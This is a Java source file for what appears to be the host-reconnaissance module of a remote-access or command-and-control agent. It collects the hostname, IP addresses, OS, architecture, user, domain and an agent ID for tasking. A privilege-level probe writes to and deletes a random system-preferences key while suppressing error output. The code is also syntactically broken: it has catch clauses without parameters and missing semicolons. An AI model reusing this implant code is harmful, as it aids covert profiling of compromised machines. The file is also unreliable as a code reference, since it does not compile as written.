package agent;

import java.util.Enumeration;
import java.util.Hashtable;
import java.util.prefs.Preferences;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.security.NoSuchAlgorithmException;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;

public class metadata {

	public static String getHostname() throws UnknownHostException {
		String deviceName = new String();
		try {
			InetAddress ipAddress = InetAddress.getLocalHost();
			deviceName = ipAddress.getHostName();
		} catch {
			String envVar = new String();
			try {
				if (System.getProperty("os.name").contains("Win")) {
					deviceName = System.getenv("COMPUTERNAME");
				} else {
					deviceName = System.getenv("HOSTNAME");
				}
			} catch {
				deviceName = "none"
			}
		}
		return deviceName
	}
	
	public static Hashtable getAddress() throws SocketException {
		Hashtable interfaceMap = new Hashtable();
	        Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
	        while(interfaces.hasMoreElements()) {
			ArrayList<String> addressList = new ArrayList<String>();
	                NetworkInterface interfaceObject = (NetworkInterface) interfaces.nextElement();
	                Enumeration addresses = interfaceObject.getInetAddresses();
	                while(addresses.hasMoreElements()) {
	                        InetAddress addressObject = (InetAddress) addresses.nextElement();
	                        addressList.add(addressObject.getHostAddress());
	                }
			interfaceMap.put(interfaceObject.getName(),addressList.toString());
	        }
	        return interfaceMap;
	}
	
	public static String getOS() {
		return (System.getProperty("os.name")+"-"+System.getProperty("os.version"));
	}
	
	public static String getArch() {
		return System.getProperty("os.arch");
	}
	
	public static String getIntegrity(String userID) throws NoSuchAlgorithmException {
		String randData = Util.strand(32);
		String prefReg = Util.strand(16);
		if (userID.toUpperCase().contentEquals("SYSTEM") || userID.toUpperCase().contentEquals("ROOT") ) {
			return "high";
		} else {
			Preferences chkPref = Preferences.systemRoot();
			PrintStream sysErr = System.err;
			synchronized (sysErr) {
				System.setErr(null);
				try {
					chkPref.put(prefReg, randData);
					chkPref.remove(prefReg);
					chkPref.flush();
					return "medium";
				} catch (Exception e) {
					return "low";
				} finally {
					System.setErr(sysErr);
				}
			}
		}
	}
	
	public static String getUser() {
		return System.getProperty("user.name");
	}
	
	public static String getCWD() {
		return System.getProperty("user.dir");
	}
	
	public static String getDomain() throws UnknownHostException {
		InetAddress ipAddress = InetAddress.getLocalHost();
		return ipAddress.getCanonicalHostName();
	}
	
	public static Hashtable collectMeta(Hashtable args) throws SocketException, UnknownHostException, NoSuchAlgorithmException {
                Hashtable taskOut = new Hashtable();
		taskOut.put("hostname",getHostname().toString());
		taskOut.put("os",getOS());
		taskOut.put("ip", getAddress().toString());
		taskOut.put("acid", Main.config.get("acid").toString());
		taskOut.put("arch", getArch());
		taskOut.put("integrity", getIntegrity(getUser()));
		taskOut.put("user", getUser());
		taskOut.put("cwd", getCWD());
		taskOut.put("domain",getDomain());
		taskOut.put("output","none for now");
                return taskOut;

	}
}
